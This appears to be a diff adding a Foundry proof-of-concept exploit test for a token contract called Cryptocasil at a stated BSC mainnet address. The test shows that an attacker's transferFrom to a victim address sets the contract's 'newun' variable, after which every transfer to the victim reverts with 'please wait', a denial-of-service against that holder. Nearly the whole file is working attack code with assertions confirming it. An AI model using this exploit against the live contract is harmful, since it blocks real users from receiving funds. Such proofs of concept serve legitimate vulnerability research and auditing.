@@ -1,0 +1,66 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.5.17;
+
+import "forge-std/Test.sol";
+
+// Minimal interface for the Cryptocasil token
+interface ICryptocasil {
+    function balanceOf(address) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function newun() external view returns (address);
+    function owner() external view returns (address);
+    function totalSupply() external view returns (uint256);
+}
+
+contract ExploitTest is Test {
+    // Deployed contract on BSC
+    address constant TARGET = 0x63769c0499f94D4E31fAc0F01D5d226bdd2C927D;
+    ICryptocasil constant token = ICryptocasil(TARGET);
+
+    address constant VICTIM = address(0xDEAD);
+    address attacker = address(this);
+
+    function setUp() public {
+        vm.label(TARGET, "Cryptocasil");
+        vm.label(VICTIM, "Victim");
+        vm.label(attacker, "Attacker");
+
+        // Use deal to give attacker some tokens so we can call transferFrom
+        // The token has totalSupply = 1e30, and balances are stored in a mapping.
+        // deal is compatible with simple ERC20 balances mapping.
+        deal(TARGET, attacker, 1000 * 1e18);
+        require(token.balanceOf(attacker) >= 1000 * 1e18, "deploy: balance not set");
+    }
+
+    function testExploit() public {
+        // Ensure newun is initially zero
+        assertEq(token.newun(), address(0), "newun should be zero initially");
+
+        // Attacker approves itself to spend tokens
+        vm.startPrank(attacker);
+        token.approve(attacker, 1);
+        vm.stopPrank();
+
+        // Call transferFrom to set newun = VICTIM
+        vm.prank(attacker);
+        token.transferFrom(attacker, VICTIM, 1);
+
+        // Verify newun has been set to victim
+        assertEq(token.newun(), VICTIM, "newun should be victim");
+
+        // Now any transfer to VICTIM should revert
+        vm.expectRevert(bytes("please wait"));
+        token.transfer(VICTIM, 1);
+
+        // Also transferFrom to VICTIM reverts
+        vm.expectRevert(bytes("please wait"));
+        token.transferFrom(attacker, VICTIM, 1);
+
+        // Assert that attacker still has tokens (the transferFrom succeeded)
+        assertEq(token.balanceOf(attacker), 1000 * 1e18 - 1, "attacker balance decreased");
+    }
+}
+```
